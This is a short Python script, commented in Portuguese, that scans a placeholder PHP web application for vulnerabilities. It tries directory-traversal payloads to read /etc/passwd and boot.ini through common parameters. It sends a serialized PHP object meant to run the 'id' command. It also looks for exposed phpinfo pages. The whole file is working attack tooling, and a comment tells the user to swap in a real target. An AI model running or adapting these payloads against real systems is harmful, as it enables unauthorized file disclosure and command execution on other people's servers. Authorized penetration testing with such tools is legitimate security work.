import requests
import urllib.parse

TARGET = "https://exemplo.com/app/index.php"  # <--- Substituir pelo alvo real

def test_lfi():
    print("[*] Testando LFI em parâmetros comuns...")
    lfi_paths = [
        "../../../../../../../../etc/passwd",
        "/etc/passwd",
        "../../boot.ini"
    ]
    lfi_params = ["page", "file", "inc", "include", "template"]

    for param in lfi_params:
        for path in lfi_paths:
            payload = {param: path}
            resp = requests.get(TARGET, params=payload)
            if "root:x" in resp.text:
                print(f"[+] LFI encontrado: ?{param}={path}")
                return
    print("[-] Nenhum LFI encontrado.")

def test_unserialize():
    print("[*] Testando vulnerabilidade de deserialização PHP...")
    # Payload serializado com __destruct
    payload = 'O:8:"EvilObj":1:{s:3:"cmd";s:2:"id";}'
    vulnerable_params = ["data", "obj", "input", "serialize"]

    for param in vulnerable_params:
        resp = requests.get(TARGET, params={param: payload})
        if "uid=" in resp.text or "gid=" in resp.text:
            print(f"[+] Deserialização perigosa detectada via ?{param}")
            return
    print("[-] Nenhuma deserialização insegura detectada.")

def test_phpinfo():
    print("[*] Verificando se há páginas de debug com phpinfo() expostas...")
    candidates = ["/phpinfo.php", "/info.php", "/test.php"]
    for path in candidates:
        resp = requests.get(TARGET + path)
        if "phpinfo()" in resp.text:
            print(f"[+] Página phpinfo encontrada: {path}")
            return path
    print("[-] Nenhuma página phpinfo exposta.")
    return None

if __name__ == "__main__":
    print("[*] Iniciando testes em:", TARGET)
    test_lfi()
    test_unserialize()
    test_phpinfo()
